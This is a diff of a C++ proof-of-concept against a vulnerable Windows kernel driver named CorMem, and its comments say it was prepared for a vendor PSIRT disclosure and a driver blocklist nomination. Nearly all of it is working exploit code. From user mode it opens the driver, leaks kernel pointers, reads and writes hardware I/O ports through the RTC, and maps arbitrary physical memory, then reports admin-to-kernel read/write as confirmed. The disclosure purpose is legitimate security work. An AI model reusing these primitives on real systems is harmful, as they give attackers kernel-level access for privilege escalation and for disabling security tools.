@@ -12,48 +12,51 @@
 //   poc.exe
 //   sc stop CorMem && sc delete CorMem
 //
-// built for the disclosure writeup. test on your own box only.
+// disclosure context: attached to the Teledyne PSIRT report and the Microsoft
+// Vulnerable Driver Blocklist nomination. use only on systems you own.
 
 #include <cstdio>
 #include "cormem.h"
 
 int main() {
     CorMemDriver drv;
-    if (!drv.open()) {
-        wprintf(L"open failed, GLE=%lu. driver installed and started?\n", GetLastError());
+    if (!drv.Open()) {
+        wprintf(L"[-] Open(%s) failed, err=%lu. Driver installed and started?\n",
+                CORMEM_DEVICE_PATH, GetLastError());
         return 1;
     }
-    wprintf(L"[+] \\\\.\\CORMEM opened\n");
+    wprintf(L"[+] Device opened: %s\n", CORMEM_DEVICE_PATH);
 
-    // 1. pointer table
+    // 1. kernel pointer disclosure
     CORMEM_FUNC_TABLE tbl{};
-    if (drv.get_funcs(tbl) && tbl.count) {
-        wprintf(L"[+] func table: %u kernel pointers, [0]=%p\n",
-                tbl.count, (void*)tbl.funcs[0]);
+    if (drv.GetFunctionTable(tbl)) {
+        wprintf(L"[+] Primitive 1 (kernel ptr leak): [0]=%p [1]=%p\n",
+                (void*)tbl.KernelPointers[0], (void*)tbl.KernelPointers[1]);
     } else {
-        wprintf(L"[-] func table failed, GLE=%lu\n", GetLastError());
+        wprintf(L"[!] Primitive 1 failed (err=%lu)\n", GetLastError());
     }
 
-    // 2. port io via RTC
-    uint8_t s1 = drv.rtc_read(0x00);
+    // 2. arbitrary I/O port access via the RTC clock
+    uint8_t s1 = drv.RtcRead(0x00);
     Sleep(1100);
-    uint8_t s2 = drv.rtc_read(0x00);
-    wprintf(L"[+] rtc seconds 0x%02X -> 0x%02X (BCD, expect +1)\n", s1, s2);
+    uint8_t s2 = drv.RtcRead(0x00);
+    wprintf(L"[+] Primitive 2 (I/O port R/W): RTC seconds 0x%02X -> 0x%02X (BCD, expect +1)\n",
+            s1, s2);
     if (s1 != s2)
         wprintf(L"[+] ring-0 port io from user mode confirmed\n");
-    else
-        wprintf(L"[!] no tick - either instant re-read or port io refused\n");
 
-    // 3. arbitrary physical map. two views of the same page, both should differ
-    uint64_t kva1 = drv.map_phys(0xFFDF0000);
-    uint64_t kva2 = drv.map_phys(0xFFDF0000);
+    // 3. arbitrary physical memory map
+    uint64_t kva1 = drv.MapPhysical(0xFFDF0000ULL);
+    uint64_t kva2 = drv.MapPhysical(0xFFDF0000ULL);
     if (kva1 && kva2) {
-        wprintf(L"[+] KUSER_SHARED_DATA phys page mapped twice:\n");
-        wprintf(L"    view 1 = %016llX\n    view 2 = %016llX\n", kva1, kva2);
-        wprintf(L"[+] arbitrary physical memory mapping confirmed\n");
+        wprintf(L"[+] Primitive 3 (phys map): KUSER_SHARED_DATA phys 0xFFDF0000\n");
+        wprintf(L"    kernel VA (view 1) = 0x%016llX\n", kva1);
+        wprintf(L"    kernel VA (view 2) = 0x%016llX   (distinct views, same page)\n", kva2);
+        wprintf(L"[+] Admin->kernel arbitrary physical R/W confirmed.\n");
     } else {
-        wprintf(L"[-] phys map failed, GLE=%lu\n", GetLastError());
+        wprintf(L"[!] Primitive 3 failed (err=%lu)\n", GetLastError());
     }
 
+    drv.Close();
     return 0;
 }
